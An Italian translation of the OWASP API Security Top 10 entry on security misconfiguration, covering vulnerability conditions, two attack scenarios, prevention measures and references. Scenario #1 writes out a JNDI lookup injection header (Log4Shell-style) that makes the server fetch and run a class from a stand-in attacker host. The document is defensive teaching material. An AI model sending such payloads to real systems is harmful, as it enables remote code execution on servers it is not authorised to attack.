# API8:2023 Security Misconfiguration

| Agenti di Minaccia/Vettori di Attacco | Debolezza di Sicurezza | Impatti |
| - | - | - |
| Specifico per API : Sfruttabilità **Facile** | Diffusione **Elevata** : Rilevabilità **Facile** | Tecnico **Grave** : Specifico per il Business |
| Gli attaccanti tentano spesso di trovare falle non patchate, endpoint comuni, servizi in esecuzione con configurazioni di default non sicure o file e directory non protetti per ottenere accesso non autorizzato o informazioni sul sistema. Gran parte di queste informazioni è di dominio pubblico e potrebbero essere disponibili exploit. | La configurazione errata della sicurezza può verificarsi a qualsiasi livello dello stack API, dal livello di rete al livello applicativo. Sono disponibili strumenti automatizzati per rilevare e sfruttare configurazioni errate come servizi non necessari o opzioni legacy. | Le configurazioni errate della sicurezza non espongono solo dati sensibili degli utenti, ma anche dettagli di sistema che possono portare alla compromissione totale del server. |

## L'API è Vulnerabile?

L'API potrebbe essere vulnerabile se:

* Manca un adeguato hardening della sicurezza in qualsiasi parte dello stack
  API, o se i permessi sui servizi cloud sono configurati in modo errato
* Mancano le patch di sicurezza più recenti, o i sistemi non sono aggiornati
* Funzionalità non necessarie sono abilitate (ad esempio verbi HTTP,
  funzionalità di logging)
* Ci sono discrepanze nel modo in cui le richieste in ingresso vengono
  elaborate dai server nella catena HTTP
* Manca il Transport Layer Security (TLS)
* Le direttive di sicurezza o di controllo della cache non vengono inviate ai
  client
* Manca o è impostata in modo errato una policy Cross-Origin Resource Sharing
  (CORS)
* I messaggi di errore includono stack trace o espongono altre informazioni
  sensibili

## Scenari di Attacco di Esempio

### Scenario #1

Un server back-end API mantiene un log degli accessi scritto da un popolare
strumento di logging open source di terze parti che supporta l'espansione dei
placeholder e le lookup JNDI (Java Naming and Directory Interface), entrambe
abilitate per impostazione predefinita. Per ogni richiesta, viene scritta una
nuova voce nel file di log con il seguente schema:
`<method> <api_version>/<path> - <status_code>`.

Un attaccante invia la seguente richiesta API, che viene scritta nel file di
log degli accessi:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

A causa della configurazione di default non sicura dello strumento di logging
e di una policy permissiva per il traffico in uscita, nel tentativo di scrivere
la voce corrispondente nel log degli accessi espandendo il valore nell'header
di richiesta `X-Api-Version`, lo strumento di logging recupererà ed eseguirà
l'oggetto `Malicious.class` dal server remoto controllato dall'attaccante.

### Scenario #2

Un sito di social network offre una funzionalità di "messaggio diretto" che
consente agli utenti di mantenere conversazioni private. Per recuperare nuovi
messaggi per una specifica conversazione, il sito invia la seguente richiesta
API (non è richiesta l'interazione dell'utente):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Poiché la risposta API non include l'header HTTP `Cache-Control`, le
conversazioni private finiscono nella cache del browser web, consentendo ad
attori malintenzionati di recuperarle dai file di cache del browser nel
filesystem.

## Come Prevenire

Il ciclo di vita dell'API dovrebbe includere:

* Un processo di hardening ripetibile che consenta una distribuzione rapida e
  semplice di un ambiente adeguatamente protetto
* Un'attività di revisione e aggiornamento delle configurazioni sull'intero
  stack API. La revisione dovrebbe includere: file di orchestrazione, componenti
  API e servizi cloud (ad esempio permessi dei bucket S3)
* Un processo automatizzato per valutare continuamente l'efficacia della
  configurazione e delle impostazioni in tutti gli ambienti

Inoltre:

* Assicurarsi che tutte le comunicazioni API dal client al server API e a tutti
  i componenti downstream/upstream avvengano su un canale di comunicazione
  cifrato (TLS), indipendentemente dal fatto che si tratti di un'API interna o
  esposta al pubblico.
* Essere specifici riguardo ai verbi HTTP con cui ciascuna API può essere
  acceduta: tutti gli altri verbi HTTP dovrebbero essere disabilitati
  (ad esempio HEAD).
* Le API che si prevede vengano accedute da client basati su browser (ad esempio
  il front-end di una WebApp) dovrebbero come minimo:
    * implementare una corretta policy Cross-Origin Resource Sharing (CORS)
    * includere gli header di sicurezza applicabili
* Limitare i tipi di contenuto/formati di dati in ingresso a quelli che
  soddisfano i requisiti funzionali/di business.
* Assicurarsi che tutti i server nella catena HTTP (ad esempio load balancer,
  proxy inversi e diretti, e server back-end) processino le richieste in
  ingresso in modo uniforme per evitare problemi di desync.
* Dove applicabile, definire e applicare tutti gli schemi dei payload di risposta
  API, incluse le risposte di errore, per evitare che stack trace e altre
  informazioni preziose vengano inviate agli attaccanti.

## Riferimenti

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### Esterni

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/